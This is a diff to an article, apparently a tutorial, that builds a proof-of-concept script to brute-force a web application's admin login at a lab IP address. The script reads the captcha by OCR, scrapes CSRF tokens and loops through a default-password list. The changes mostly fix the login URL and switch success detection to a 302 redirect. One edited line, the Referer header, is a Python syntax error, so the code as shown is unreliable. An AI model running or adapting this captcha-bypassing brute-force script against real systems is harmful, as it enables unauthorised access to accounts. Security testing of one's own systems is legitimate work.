@@ -306,9 +306,11 @@ If we login with right credentials we can see a 302 redirection.
 
 I did a simple test for the right login detection. If we find no error message, it's a successful login. It's just for the POC. Better have a test case with the 302 redirection status code.
 
-Note : My post request refuses to stop following redirects with the option "allow_redirects=False". I'll do some research later to clean up the test cases in my tool.
+Note : 
+- My post request refuses to stop following redirects with the option "allow_redirects=False". 
+- The probleme is with the used url, i need to use `/index.php?mainmenu=home` instead of `/admin/index.php?mainmenu=home` to have the 302 redirection.
 
-# Final code POC
+# POC 
 
 Now i'll combine the ocr reading with the login post request to bruteforce login.
 - I'll use beautifulsoup library to extract token and error messages.
@@ -317,7 +319,7 @@ Now i'll combine the ocr reading with the login post request to bruteforce login
 - Get the used cookies
 - Simple code structure for testing. I'll make a clean version in my github repository for the tool (at the end of the article).
 
-## POC
+## POC code
 
 ```python
 import requests
@@ -343,7 +345,7 @@ passwords = open("default-passwords.txt", "r")
 
 base_url = "http://192.168.1.110/"
 
-login_url = base_url + "/admin/index.php?mainmenu=home"
+login_url = base_url + "index.php?mainmenu=home"
 
 headers = CaseInsensitiveDict()
 
@@ -380,17 +382,17 @@ for password in passwords:
         headers["Connection"] = "keep-alive"
         headers["Cache-Control"] = "max-age=0"
         headers["Upgrade-Insecure-Requests"] = "1"
-        headers["Origin"] = "http://192.168.1.110"
+        headers["Origin"] = base_url
         headers["Content-Type"] = "application/x-www-form-urlencoded"
         headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36"
         headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
-        headers["Referer"] = "http://192.168.1.110/admin/index.php?mainmenu=home"
+        headers["Referer"] = base_url + index.php?mainmenu=home"
         headers["Accept-Language"] = "en-US,en;q=0.9,ar;q=0.8,fr;q=0.7"
 
         # you can use json object or f string format
         data = "token=" + str(urllib.parse.quote(token,safe='')) + "&actionlogin=login&loginfunction=loginfunction&tz=1&tz_string=Africa%2FCasablanca&dst_observed=0&dst_first=2022-05-8T01%3A59%3A00Z&dst_second=2022-03-27T02%3A59%3A00Z&screenwidth=1038&screenheight=718&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=" + str(username) + "&password=" + str(password[:-1]) + "&code=" + str(captcha)
 
-        resp = session.post(login_url, headers=headers, data=data, cookies=cookies, allow_redirects=False) # stop redirect to catch 302 (didn't work
+        resp = session.post(login_url, headers=headers, data=data, cookies=cookies, allow_redirects=False) 
 
         login = BeautifulSoup(resp.text,"lxml")
 
@@ -406,8 +408,8 @@ for password in passwords:
                 if (error_message.text.strip() == "Bad value for security code. Try again with new value..."):
                     print(f"[!] [{resp.status_code}] Wrong captcha ocr. Retrying...")
                     
-        # simple test case. It's better to do it with 302 status code.        
-        else:
+              
+        if resp.status_code == 302 :
             print(f"[*] Done! {username}:{password[:-1]} ")
             sys.exit()
 
